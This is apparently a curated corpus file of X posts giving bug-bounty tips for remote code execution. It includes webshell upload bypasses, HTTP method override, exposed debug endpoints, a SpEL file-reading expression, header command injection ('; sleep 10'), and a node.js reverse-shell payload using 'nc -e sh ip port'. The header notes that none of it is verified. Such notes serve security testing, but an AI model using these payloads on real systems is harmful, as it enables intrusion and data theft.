# X 经验语料 · rce

来源：X 公开贴子，经逐条判定后归入「经验」桶，含可直接套用的做法与载荷。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[命令与 RCE](../by-type/cmd-injection-rce.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-rce-1（69 条）、x-residual-rce（7 条） · 本文 64 行

- If server only allows GET and POST method, then try adding “X-HTTP-Method -Override: PUT to achieve RCE via PUT method.
- If you ever get the ability to run arbitrary Python code on a server try to get RCE by running:
  import os;os.system("ls");
  Replacing "ls" with any number of shell commands.
- while testing for malicious file uploads, if .php extension is blacklisted you can try .PhP , .php5 and .php3
  Sometime this fools the backend and you get shell!
- Tip 1: Always check document upload section
  2. If your request is going to admin try to escalate using burp-collaborator.
- File Upload Bypass Trick
  While uploading shell.php if you are getting error in javascript pop-up.
  Then just disable your Javascript from the browser(restart it) and try to upload it again.
- If your target is Laravel and has debug mode enabled, you can check for /asf/terminal (external package) URI to get a terminal access and use Laravel Tinker to obtains RCE.
- When testing for File-upload vulnerability sends an empty name, see if an error trace is been disclosed in source code, if it is java .io error you can try ysoserial and send your serialized payload, you may be able to get rce.
- Always try to make an unusual condition that the application didn’t expected. You can get a crash message that might leak sensitive info. Below is a SS of root ssh password disclosure which I found while exploiting a command injection.
  https://shawarkhan.com/2021/01/analysing-crash-messages-to-achieve.html?m=1
- Disclosure of Software Version to RCE
  > Send request -> Analyze response headers
  > Check software version disclosed in response
  > Any exploit for this version of the software?
  (exploit-db)
  > Download exploit -> launch the exploit -> RCE
- report: RCE with PUT method
  poc:
  found path http://example.ibm/files/ with error 403
  try to bypass with other methods using ''put'' method and response 201 was created file from request
  generate webshell from weevely tool
- if you somehow get the ability to modify an AWS config file, the 'credential_process' key could be used for RCE code execution.
  https://docs.aws.amazon.com/cli/latest/topic/config-vars.html#sourcing-credentials-from-external-processes
- PHP RCE bypass filters/sanitization/WAF:
  https://secjuice.com/php-rce-bypass-filters-sanitization-waf/
- Easy RCE on Vodafone via http-method PUT enable.
  Always look in http-method
- Also everytime check the directories below on symfony targets
  /_fragement
  /_profiler
  You may found phpinfo contains symfony secret will lead you to execute PHP functions and get RCE
- If you can get SpEL injection but can't get RCE, try exfiltrating a file with B64 encoding: T(java.util.Base64).getEncoder().encodeToString(T(http://org.apache.commons.io.FileUtils).readFileToString('/proc/self/cmdline').getBytes())
- If you discover a node.js template area, you should try triggerable node payload; require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}
  so you can get RCE
- If you find an XXE look for technology, if there’s PHP behind, it might be vulnerable to RCE using expect schema. Expect schema is supported from some PHP libraries like libxml and libxslt.
- A Very Unrated Vulnerability but Dependecy Confusion attacks always lead To RCE ( Remote code Execution )
- Did you know that the Java Debug Wire Protocol is often exposed to the internet, making it possible to achieve (RCE)?
  https://ioactive.com/hacking-java-debug-wire-protocol-or-how/
- Note: achieving RCE this way needs some luck - by default, the web user doesn't have write access to the Tomcat configuration, but it is still worth a try.
- RCE Bug On T-Mobile's Custom Header
  Vulnerable Header:
  X-Export-Format: pdf ; Payload
  Tip: Always test your payloads on custom headers, as the header may be vulnerable, as in this case
- Never ignore custom HTTP headers!
  An RCE bug can hide in plain sight. Always test them for command injection like this:
  X-Custom-Header: value ; sleep 10
  If it delays, you've got shell access!
- File Upload to RCE
  1. Bypass the filter upload
  2. PHP Exploit
  3. Remote Code Execution
  More.. https://ahmed8magdy.medium.com/file-upload-to-rce-538bb4128062
